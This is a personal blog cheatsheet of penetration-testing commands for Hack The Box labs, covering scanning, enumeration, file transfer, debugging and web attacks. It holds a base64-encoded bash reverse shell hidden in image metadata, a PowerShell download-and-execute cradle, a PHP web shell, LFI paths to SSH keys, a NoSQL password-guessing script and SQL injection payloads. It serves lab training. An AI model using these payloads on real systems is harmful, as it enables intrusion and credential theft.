<!DOCTYPE html> <html lang="pt-br"> <head> <meta charset="utf-8"> <meta http-equiv="X-UA-Compatible" content="IE=edge"> <meta name="viewport" content="width=device-width, initial-scale=1"> <title> HTB Cheatsheet &bull; retostaehli </title> <meta name="description" content="In this post you will find several commands I used while having fun with “Hack the Box” and tipps I found while searching the internet."> <link rel="stylesheet" href="/css/main.css"> <link rel="canonical" href="http://retostaehli.github.io/htb-cheatsheet/"> </head> <body class="htb-cheatsheet"> <main class="main"> <header class="header"> <div class="overlay"> <div class="container"> <h1 class="title"> <a href="/">retostaehli</a> <small>blog</small> </h1> <nav class="navbar"> <a href="#" class="menu-icon"> <span></span> <span></span> <span></span> </a> <ul class="nav"> <li><a href="/about">about</a></li> <li><a href="/author">author</a></li> <li><a href="https://github.com/retostaehli" target="_blank">github</a></li> </ul> </nav> </div> </div> </header> <article class="post container card"> <header class="post-header"> <h1 class="post-title">HTB Cheatsheet</h1> <span class="post-meta"> <time class="post-date" datetime="2019-11-28">Nov 28, 2019</time> <span class="post-author">by retostaehli</span> </span> </header> <div class="post-content"> <p>In this post you will find several commands I used while having fun with <a href="https://www.hackthebox.eu">“Hack the Box”</a> and tipps I found while searching the internet.</p> <h2 id="enumeration--recon">Enumeration / Recon</h2> <p>Various commands and tools to enumerate a system and perform recon.</p> <p>A great reference can be found on <a href="http://0daysecurity.com/penetration-testing/enumeration.html">0daysecurity.com</a></p> <h3 id="nmap">Nmap</h3> <p>Full scan TCP:</p> <div class="language-zsh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-p-</span> <span class="nt">-oA</span> host_tcp 10.10.10.10
</code></pre></div></div> <p>Full scan UDP:</p> <div class="language-zsh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-sU</span> <span class="nt">-p-</span> <span class="nt">-oA</span> host_udp 10.10.10.10
</code></pre></div></div> <p>The above is most likely going to take ages due to retries and service enumeration on filtered ports. A better approach is to do a quick scan and then scan more torough after finding the ports that are actually open:</p> <div class="language-zsh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-sU</span> <span class="nt">-p-</span> <span class="nt">-T4</span> <span class="nt">--max-retries</span> 1 <span class="nt">-oA</span> quick_udp_all 10.10.10.10
</code></pre></div></div> <p>This might miss some ports with max-retries 1 just because of how UDP works. So maybe adjust this number.</p> <p>Full scan TCP but faster:</p> <div class="language-zsh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-p-</span> <span class="nt">-T4</span> <span class="nt">-oA</span> host_tcp 10.10.10.10
</code></pre></div></div> <p>List of aggregate timing options:</p> <ul> <li>T0 - Paranoid: Very slow, used for IDS evasion</li> <li>T1 - Sneaky: Very slow, used for IDS evasion</li> <li>T2 - Polite: Slows down to consume less BW, runs ~10 times slower than default</li> <li>T3 - Normal: This is the default and is based on target responsiveness - can be slow if ports get filtered</li> <li>T4 - Aggressive: Assumes fast and reliable network - may overwhelm targets</li> <li>T5 - Insane: Very agressive - will most likely overwhelm targets and might miss open ports.</li> </ul> <p>Scan Top 1000 Ports TCP:</p> <div class="language-zsh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">--top-ports</span> 1000 <span class="nt">-oA</span> host_tcp 10.10.10.10
</code></pre></div></div> <p>Detect Heartbleed SSL Vuln:</p> <div class="language-zsh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-sV</span> <span class="nt">-p</span> 443 <span class="nt">--script</span><span class="o">=</span>ssl-heartbleed 10.10.10.0/24
</code></pre></div></div> <p>Detect OS version based on fingerprint (TTL value / TCP window size etc.):</p> <div class="language-zsh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-O</span> 10.10.10.10
</code></pre></div></div> <p>To generate a <code class="highlighter-rouge">tcpdump</code> of the scan traffic, add the option <code class="highlighter-rouge">--packet-trace</code></p> <p>To search for scripts, use find with the specific keyword:</p> <div class="language-zsh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>find / - iname <span class="s1">'krb*.nse'</span>
</code></pre></div></div> <h3 id="gobuster">Gobuster</h3> <p>Scan for directories</p> <div class="language-zsh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gobuster dir <span class="nt">-u</span> http://10.10.10.10 <span class="nt">-w</span> /usr/share/dirb/wordlists/common.txt
</code></pre></div></div> <p>Scan for files:</p> <div class="language-zsh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gobuster <span class="nt">-u</span> http://10.10.10.10 <span class="nt">-w</span> /usr/share/wordlists/dirb/common.txt <span class="nt">-x</span> php,html,htm,asp,aspx,bak,txt,tmp
</code></pre></div></div> <h3 id="binary">Binary</h3> <p>Check filemagic:</p> <div class="language-zsh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>file testfile.jpeg
</code></pre></div></div> <p>Check if file contains other binaries:</p> <div class="language-zsh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>binwalk testfile.wav
</code></pre></div></div> <h3 id="metadata">Metadata</h3> <p>Search for email adresses:</p> <div class="language-zsh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>exiftool <span class="k">*</span> | <span class="nb">grep</span> <span class="nt">-i</span> <span class="s1">'@'</span>
</code></pre></div></div> <p>Search for author in *.doc:</p> <div class="language-zsh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>exiftool <span class="k">*</span>.docx | <span class="nb">grep</span> <span class="nt">-i</span> creator
</code></pre></div></div> <p>Smuggle binary code into metadata to sometimes bypass binary checks:</p> <div class="language-zsh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>exiftool <span class="nt">-Certificate</span><span class="o">=</span><span class="s1">'YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC44Ni85OTg4IDA+JjEK='</span> uploadtest.png
</code></pre></div></div> <p>The Payload is base64 encoded:</p> <div class="language-zsh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;</span> decode YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC44Ni85OTg4IDA+JjE<span class="o">=</span>
bash <span class="nt">-i</span> <span class="o">&gt;</span>&amp; /dev/tcp/10.10.14.86/9988 0&gt;&amp;1
</code></pre></div></div> <p><code class="highlighter-rouge">decode</code> is a helper script:</p> <div class="language-zsh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>decode <span class="o">()</span> <span class="o">{</span>
  <span class="nb">echo</span> <span class="s2">"</span><span class="nv">$1</span><span class="s2">"</span> | base64 <span class="nt">-d</span> <span class="p">;</span> <span class="nb">echo</span>
<span class="o">}</span>
</code></pre></div></div> <h3 id="curl">CURL</h3> <p>Probing Website and interpret html in cli:</p> <div class="language-zsh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-v</span> <span class="nt">-k</span> https://10.10.10.10 | html2text
</code></pre></div></div> <p>The <code class="highlighter-rouge">-k</code> or <code class="highlighter-rouge">--insecure</code> is used to bypass certificate checks.</p> <p>Issue a POST request:</p> <div class="language-zsh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-d</span> <span class="s1">'id=9&amp;name=bad'</span> http://10.10.10.10/rest-api/rooms/new
</code></pre></div></div> <p>or, pass a file containing the request body to the data option like this:</p> <div class="language-zsh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-d</span> @request.json <span class="nt">-H</span> <span class="s2">"Content-Type: application/json"</span> http://10.10.10.10/rest-api/rooms/new
</code></pre></div></div> <p>For <code class="highlighter-rouge">PUT</code> and <code class="highlighter-rouge">DELETE</code> use:</p> <div class="language-zsh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-d</span> @request.json <span class="nt">-H</span> <span class="s1">'Content-Type: application/json'</span> <span class="nt">-X</span> PUT http://10.10.10.10/rest-api-rooms/new
</code></pre></div></div> <p>The object can also be written direct:</p> <div class="language-zsh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-H</span> <span class="s2">"Content-Type: application/json"</span> <span class="nt">-k</span> <span class="nt">-X</span> POST <span class="nt">-d</span> <span class="s1">'{"brewer":"Felsenau", "name":"Wunderbraeu", "style":"Wheat", "abv":"0.5"}'</span> https://beer.brewery.htb/api/beer/
</code></pre></div></div> <p>To add or modify headers use the <code class="highlighter-rouge">-H</code> switch:</p> <div class="language-zsh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-H</span> <span class="s2">"Host: test.htb"</span> http://10.10.10.10
</code></pre></div></div> <p>Remove User-Agent:</p> <div class="language-zsh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-H</span> <span class="s2">"User-Agent:"</span> http://10.10.10.10
</code></pre></div></div> <p>Authenticate with <code class="highlighter-rouge">--user</code>:</p> <div class="language-zsh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">--user</span> username:password http://10.10.10.10/
</code></pre></div></div> <p>Upload a file to a FTP server using curl:</p> <div class="language-zsh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-T</span> file.tar.gz ftp://username:password@10.10.10.10/dir
</code></pre></div></div> <h3 id="strings">Strings</h3> <p>Check for strings that are 32 characters or more:</p> <div class="language-zsh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>strings <span class="nt">-32</span> testfile.bin
</code></pre></div></div> <p>Check for a specific word:</p> <div class="language-zsh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>strings <span class="nt">-8</span> testfile.dat | <span class="nb">grep</span> <span class="nt">-i</span> username
</code></pre></div></div> <p>Show linenumber of the found string:</p> <div class="language-zsh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>strings <span class="nt">-4</span> <span class="nt">-t</span> d testfile.dat | <span class="nb">grep</span> <span class="nt">-i</span> username
</code></pre></div></div> <h3 id="ldap">LDAP</h3> <p>Showing all namingContexts:</p> <div class="language-zsh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ldapsearch <span class="nt">-h</span> 10.10.10.10 <span class="nt">-x</span> <span class="nt">-b</span> <span class="s2">""</span> <span class="nt">-s</span> base namingContexts
</code></pre></div></div> <p>Using the found informations, query the LDAP with the specific baseDN:</p> <div class="language-zsh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ldapsearch <span class="nt">-h</span> 10.10.10.10 <span class="nt">-x</span> <span class="nt">-b</span> <span class="nv">dc</span><span class="o">=</span>hack,dc<span class="o">=</span>thebox,dc<span class="o">=</span><span class="nb">local</span>
</code></pre></div></div> <h3 id="smb">SMB</h3> <p>Search for shares with smbmap:</p> <div class="language-zsh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbmap <span class="nt">-H</span> 10.10.10.10
</code></pre></div></div> <p>Search for share with smbclient:</p> <div class="language-zsh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbclient <span class="nt">-L</span> //10.10.10.10
</code></pre></div></div> <p>smbclient can also use the <code class="highlighter-rouge">\\</code> notation, but this needs to be escaped which results in the command being:</p> <div class="language-zsh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbclient <span class="nt">-L</span> <span class="se">\\\\</span>10.10.10.10
</code></pre></div></div> <p>Search shares with credentials:</p> <div class="language-zsh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbmap <span class="nt">-u</span> <span class="s1">'user'</span> <span class="nt">-p</span> <span class="s1">'password'</span> <span class="nt">-d</span> <span class="s1">'workgroup'</span> <span class="nt">-H</span> 10.10.10.10
</code></pre></div></div> <p>Connecting to a share:</p> <div class="language-zsh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbclient //10.10.10.10 <span class="nt">-U</span> username%password 
</code></pre></div></div> <p>Mounting a share with credentials:</p> <div class="language-zsh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mount.cifs //10.10.10.10/Share ./smbmount <span class="nt">-o</span> <span class="nv">user</span><span class="o">=</span>reto.staehli
</code></pre></div></div> <h3 id="nfs">NFS</h3> <p>Run all nfs-nmap scripts:</p> <div class="language-zsh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-sV</span> <span class="nt">--script</span><span class="o">=</span>nfs-<span class="k">*</span> 10.10.10.10
</code></pre></div></div> <p>Show NFS shares:</p> <div class="language-zsh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>showmount <span class="nt">-e</span> 10.10.10.10
</code></pre></div></div> <p>Mount NFS shares:</p> <div class="language-zsh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mount.nfs 10.10.10.10:/path/to/share /path/to/mount <span class="nt">-o</span> <span class="nv">nfsvers</span><span class="o">=</span>3,nolock <span class="c">#nolock will prevent NLM locking, only supported in &gt;v4</span>
</code></pre></div></div> <h3 id="wfuzz">Wfuzz</h3> <p>wfuzz takes FUZZ as a placeholder</p> <p>Fuzzing a file name:</p> <div class="language-zsh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wfuzz <span class="nt">-c</span> <span class="nt">-w</span> usr/share/dirb/wordlists/common.txt http://10.0.0.2/FUZZ.php
</code></pre></div></div> <p>Fuzz an ID:</p> <div class="language-zsh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wfuzz <span class="nt">-c</span> <span class="nt">-w</span> /usr/share/SecLists/Fuzzing/3-digits-000-999.txt <span class="nt">-hc</span> 404 http://10.0.0.2/php?pageID<span class="o">=</span>FUZZ
</code></pre></div></div> <p>The <code class="highlighter-rouge">-hc</code> hides the specified responsecode</p> <p>Fuzzing a POST Request:</p> <div class="language-zsh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wfuzz <span class="nt">-c</span> <span class="nt">-w</span> /usr/share/wordlists/rockyou.txt <span class="nt">-d</span> <span class="s2">"username=FUZZ&amp;pass=FUZZ"</span> <span class="nt">--hc</span> 302 http://10.0.0.2/login.php <span class="c">#Tests for admin/admin or root/root etc</span>
</code></pre></div></div> <h2 id="data-transfer">Data transfer</h2> <h3 id="http">HTTP</h3> <p>Start a HTTP server:</p> <div class="language-zsh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python <span class="nt">-m</span> SimpleHTTPServer 9999
</code></pre></div></div> <p>If python3 is installed, use <code class="highlighter-rouge">http.server</code> instead of <code class="highlighter-rouge">SimpleHTTPServer</code></p> <h4 id="transfer-from-linux">Transfer from linux:</h4> <div class="language-zsh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wget 10.10.10.1:9999/file_to_transfer
</code></pre></div></div> <p>or</p> <div class="language-zsh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl http://10.10.10.1:9999/file_to_transfer <span class="nt">-o</span> my_file <span class="c">#-o is the same as --output</span>
</code></pre></div></div> <h3 id="linux">Linux</h3> <h3 id="windows">Windows</h3> <p>List firewall rules:</p> <div class="language-zsh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>netsh advfirewall show currentprofile
</code></pre></div></div> <p>List installed drivers:</p> <div class="language-zsh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>driverquery /v
</code></pre></div></div> <p>List scheduled tasks:</p> <div class="language-zsh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>schtasks /query /fo LIST /v
</code></pre></div></div> <p>List running services</p> <p>Powershell:</p> <div class="language-zsh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-WmiObject win32_service | Select-Object Name, State, PathName | Where-Object <span class="o">{</span><span class="nv">$_</span>.State <span class="nt">-like</span> <span class="s1">'Running'</span><span class="o">}</span>
</code></pre></div></div> <p>CMD:</p> <div class="language-zsh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tasklist /SVC
</code></pre></div></div> <div class="language-zsh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wmic service get name,displayname,pathname,startmode
</code></pre></div></div> <p>Get infos about a service (For Powershell modify the query above to further refine the result):</p> <div class="language-zsh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wmic service where <span class="nv">caption</span><span class="o">=</span><span class="s2">"Servicename"</span> get name, state, startmode
</code></pre></div></div> <h4 id="transfer-from-windows">Transfer from Windows:</h4> <div class="language-zsh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>certutil.exe <span class="nt">-urlcache</span> <span class="nt">-split</span> <span class="nt">-f</span> <span class="s2">"http://10.10.10.1:9999/file_to_transfer"</span>
</code></pre></div></div> <p>Download file with powershell</p> <div class="language-zsh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>powershell.exe <span class="o">(</span>New-Object System.Net.WebClient<span class="o">)</span>.DownloadFile<span class="o">(</span><span class="s1">'http://10.10.10.1/file_to_transfer'</span>, <span class="s1">'file_to_save'</span><span class="o">)</span>
</code></pre></div></div> <p>or execute it directly without storing:</p> <div class="language-zsh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>powershell.exe IEX <span class="o">(</span>New-Object System.Net.WebClient<span class="o">)</span>.DownloadString<span class="o">(</span><span class="s1">'http://10.10.10.1/file_to_execute.ps1'</span><span class="o">)</span>
</code></pre></div></div> <p>Powershell also supports uploading (POST req):</p> <div class="language-zsh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>powershell.exe <span class="o">(</span>New-Object System.Net.WebClient<span class="o">)</span>.UploadFile<span class="o">(</span><span class="s1">'http://10.10.10.1'</span>, <span class="s1">'file.txt'</span><span class="o">)</span>
</code></pre></div></div> <h3 id="smb-for-windows-hosts">SMB for Windows hosts</h3> <p>Start SMB server:</p> <div class="language-zsh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>impacket-smbserver share /path/to/share
</code></pre></div></div> <p>Execute scripts, or just copy files from share:</p> <div class="language-zsh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>powershell <span class="se">\\</span>10.10.10.1<span class="se">\s</span>hare<span class="se">\s</span>cript.ps1
</code></pre></div></div> <div class="language-zsh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>copy <span class="se">\\</span>10.10.10.1<span class="se">\s</span>hare<span class="se">\s</span>cript.ps1 script.ps1
</code></pre></div></div> <h2 id="reverse-engineering--debugging">Reverse engineering / Debugging</h2> <p>Use <code class="highlighter-rouge">checksec</code> on executable to list the protections are being used.</p> <h3 id="gef">GEF</h3> <p>GEF stands for GDB Enhanced Features and is basically GDB with more functionality. Start GEF with <code class="highlighter-rouge">gdb filename</code></p> <p>List all defined function within gdb:</p> <div class="language-zsh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gef&gt; info functions
</code></pre></div></div> <p>To diasassemble a function named <code class="highlighter-rouge">gofast</code></p> <div class="language-zsh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gef&gt; disass gofast
</code></pre></div></div> <p>To set breakpoint at address <code class="highlighter-rouge">0x0804852b</code></p> <div class="language-zsh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gef&gt; <span class="nb">break</span> <span class="k">*</span>0x0804852b
</code></pre></div></div> <p>To run the programm simply press <code class="highlighter-rouge">r</code> - after a breakpoint you can step with <code class="highlighter-rouge">c</code> (continue) <code class="highlighter-rouge">s</code> (step) and <code class="highlighter-rouge">n</code> (next - does not dive into functions)</p> <h4 id="find-offset-using-gef">Find offset using GEF</h4> <p>Create pattern using <code class="highlighter-rouge">pattern create size</code>. The default <code class="highlighter-rouge">size</code> is 1024 bytes.</p> <div class="language-zsh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gef➤  pattern create 50
<span class="o">[</span>+] Generating a pattern of 50 bytes
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama
<span class="o">[</span>+] Saved as <span class="s1">'$_gef2'</span>
</code></pre></div></div> <p>Increase size until a SIGSEV occurs, then check the value of the the <code class="highlighter-rouge">$rip</code> register (Instruction Pointer - in x86 refferd to as <code class="highlighter-rouge">$eip</code>)</p> <p>Find the offset by using the value of <code class="highlighter-rouge">$rip</code> with <code class="highlighter-rouge">pattern offset $rip</code></p> <div class="language-zsh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gef➤  pattern search aagjaagkaaglaagmaagnaagoaagpaagqaagraagsaagtaaguaagv
<span class="o">[</span>+] Found at offset 112 <span class="o">(</span>big-endian search<span class="o">)</span>
</code></pre></div></div> <h3 id="rop">ROP</h3> <p>To find ROP gadgets use the tool <code class="highlighter-rouge">ropper</code></p> <div class="language-zsh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ropper <span class="nt">--file</span> myapp
</code></pre></div></div> <h3 id="objdump--strace--ltrace">objdump / strace / ltrace</h3> <p>The tools mentioned in the title can be used to further examine an executable and find out what calls are used.</p> <p><code class="highlighter-rouge">strace</code> can be used to trace system calls</p> <p><code class="highlighter-rouge">ltrace</code> can be used to trace dynamic library calls</p> <p><code class="highlighter-rouge">objdump</code> can be used for a lot… :) Check <code class="highlighter-rouge">man objdump</code></p> <p>Check external functions dynamic linked on runtime:</p> <div class="language-zsh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>objdump <span class="nt">-T</span> myapp
</code></pre></div></div> <h3 id="immunitydebugger">ImmunityDebugger</h3> <p>Find modules using the command <code class="highlighter-rouge">!mona modules</code> within ImmunityDebugger</p> <p>Generate the binary representation of an assembly command using the tool <code class="highlighter-rouge">msf-nasm_shell</code></p> <div class="language-zsh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf-nasm_shell
nasm <span class="o">&gt;</span> add edi,15
00000000  83C70F            add edi,byte +0xf
nasm <span class="o">&gt;</span> jmp esp
00000000  FFE4              jmp esp
</code></pre></div></div> <p>Find certain instruction (e.g jmp esp) within a loaded module using the command <code class="highlighter-rouge">!mona find -s "\xff\xe4" -m "modulename.dll"</code></p> <h3 id="ghydra">Ghydra</h3> <h2 id="exploitation">Exploitation</h2> <h3 id="msfvenom-reverse-shell-cheatsheet">MSFVenom Reverse Shell Cheatsheet</h3> <p>Found on <a href="https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet">infinitelogins.com</a></p> <h3 id="password-cracking">Password cracking</h3> <h4 id="john">John</h4> <p>John depends on a specific format in order to be able to crack it. So if its a specific filetype (Encrypted private key / Keepass DB / RAR) first convert it to “John-Format”.</p> <p>There are a lot of premade convertingtools available on github. I stored those under <code class="highlighter-rouge">/usr/local/bin/privsec/john</code>.</p> <p>Example usage for an encrypted SSH key:</p> <div class="language-zsh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./ssh2john.py ~/Documents/id_rsa <span class="o">&gt;</span> ~/Documents/id_rsa_hash
</code></pre></div></div> <p>After converting, load john with a specific wordlist and let it run.</p> <div class="language-zsh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>john <span class="nt">--wordlist</span><span class="o">=</span>/usr/share/wordlists/rockyou.txt <span class="nt">--format</span><span class="o">=</span>SSH ~/Documents/id_rsa_hash
</code></pre></div></div> <h3 id="lfi---local-file-inclusion">LFI - Local File Inclusion</h3> <p>An introduction to PHP LFI can be found at <a href="https://websec.wordpress.com/2010/02/22/exploiting-php-file-inclusion-overview/">Exploiting PHP File Inclusion – Overview</a></p> <p>PHP LFI example:</p> <div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$file</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'page'</span><span class="p">];</span>
<span class="k">require</span><span class="p">(</span><span class="nv">$file</span><span class="p">);</span>
</code></pre></div></div> <p>Various examples from <a href="https://github.com/xmilkpowderx">MilkPowder</a>:</p> <p>read php file</p> <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>php://filter/convert.base64-encode/resource=&lt;file name/Path&gt; e.g. index
echo "&lt;output&gt;" |base64 -d
</code></pre></div></div> <p>.htaccess config.php in web root folder?</p> <p>root/user ssh keys? .bash_history?</p> <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/.ssh/id_rsa
/.ssh/id_rsa.keystore
/.ssh/id_rsa.pub
/.ssh/authorized_keys
/.ssh/known_hosts
</code></pre></div></div> <p>php Wrapper</p> <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>expect://&lt;command&gt;  
</code></pre></div></div> <p><code class="highlighter-rouge">page=php://input&amp;cmd=ls</code> in POST request</p> <div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">shell_exec</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'cmd'</span><span class="p">]);</span><span class="cp">?&gt;</span>  
</code></pre></div></div> <p>Upload Zip shell file and extract with zip</p> <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>zip://path/to/file.zip%23shell  
zip://path/to/file.zip%23shell.php  
</code></pre></div></div> <p>Check current running user <code class="highlighter-rouge">/proc/self/status</code> check uid and gid</p> <h3 id="nosqli">NoSQLi</h3> <p>NoSQL injection - more infos found from <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection">PayloadAllTheThings</a></p> <p>Use comparison operators like <code class="highlighter-rouge">$ne</code>,<code class="highlighter-rouge">$gt</code>,<code class="highlighter-rouge">$in</code> or even <code class="highlighter-rouge">$regex</code> to try and get a different response. Look carefully at responses.</p> <p>Example payload to try and guess password with a known username using a simple POST body (Backend returned <code class="highlighter-rouge">302 Found</code> if query returned a result):</p> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">import</span> <span class="nn">urllib3</span>
<span class="kn">import</span> <span class="nn">string</span>
<span class="kn">import</span> <span class="nn">urllib</span>
<span class="n">urllib3</span><span class="o">.</span><span class="n">disable_warnings</span><span class="p">()</span>

<span class="n">username</span><span class="o">=</span><span class="s">"retostaehli"</span>
<span class="n">password</span><span class="o">=</span><span class="s">""</span>
<span class="n">u</span><span class="o">=</span><span class="s">"http://10.10.10.10/login.php"</span>
<span class="n">headers</span><span class="o">=</span><span class="p">{</span><span class="s">'content-type'</span><span class="p">:</span> <span class="s">'application/x-www-form-urlencoded'</span><span class="p">}</span>

<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
    <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">string</span><span class="o">.</span><span class="n">printable</span><span class="p">:</span>
        <span class="k">if</span> <span class="n">c</span> <span class="ow">not</span> <span class="ow">in</span> <span class="p">[</span><span class="s">'*'</span><span class="p">,</span><span class="s">'+'</span><span class="p">,</span><span class="s">'.'</span><span class="p">,</span><span class="s">'?'</span><span class="p">,</span><span class="s">'|'</span><span class="p">,</span><span class="s">'&amp;'</span><span class="p">]:</span>
            <span class="n">payload</span><span class="o">=</span><span class="s">'username[$eq]=</span><span class="si">%</span><span class="s">s&amp;password[$regex]=^</span><span class="si">%</span><span class="s">s&amp;login=login'</span> <span class="o">%</span> <span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="n">password</span> <span class="o">+</span> <span class="n">c</span><span class="p">)</span>
            <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">u</span><span class="p">,</span> <span class="n">data</span> <span class="o">=</span> <span class="n">payload</span><span class="p">,</span> <span class="n">headers</span> <span class="o">=</span> <span class="n">headers</span><span class="p">,</span> <span class="n">verify</span> <span class="o">=</span> <span class="bp">False</span><span class="p">,</span> <span class="n">allow_redirects</span> <span class="o">=</span> <span class="bp">False</span><span class="p">)</span>
            <span class="c">#print(str(r.status_code) + " with char: " + c)</span>
            <span class="k">if</span> <span class="n">r</span><span class="o">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">302</span><span class="p">:</span>
                <span class="k">print</span><span class="p">(</span><span class="s">"Found one more char : </span><span class="si">%</span><span class="s">s"</span> <span class="o">%</span> <span class="p">(</span><span class="n">password</span><span class="o">+</span><span class="n">c</span><span class="p">))</span>
                <span class="n">password</span> <span class="o">+=</span> <span class="n">c</span>
</code></pre></div></div> <h3 id="ssti---serverside-template-injection">SSTI - Serverside template injection</h3> <p>Introduction to the topic found at <a href="https://www.we45.com/blog/server-side-template-injection-a-crash-course-">WE45 blogpost</a></p> <h3 id="sqli">SQLi</h3> <p>Check for possible characters which are not being escaped and alter the rest of the statement e.g <code class="highlighter-rouge">input’ or 1=1;#'</code>.</p> <p>Check how many colums the result contains using the <code class="highlighter-rouge">ORDER BY</code> statement. This will order the results by the colum number provided. Keep increasing until you receive a different result.</p> <p>Extract more data using the the <code class="highlighter-rouge">UNION ALL</code> statement. The <code class="highlighter-rouge">UNION ALL</code> accepts a second select statement which needs to provide the same number of colums and joins the results.</p> <p>Example for a query returning 3 columns:</p> <div class="language-zsh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://10.10.10.1/users.php?id<span class="o">=</span>1 union all <span class="k">select </span>1, 2, @@version <span class="c">#URLEncode this in request</span>
</code></pre></div></div> <p>Interesting fields to enumerate:</p> <p><code class="highlighter-rouge">@@version</code></p> <p><code class="highlighter-rouge">user()</code></p> <p><code class="highlighter-rouge">table_name from information_schema.tables</code></p> <p>Using the found information go deeper:</p> <p><code class="highlighter-rouge">column_name from information_schema.columns where table_name='interesting_table'</code></p> <p>Storing a file:</p> <div class="language-zsh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s2">"This content could be a shell"</span> into OUTFILE <span class="s1">'C:/directory/to/file.txt'</span>
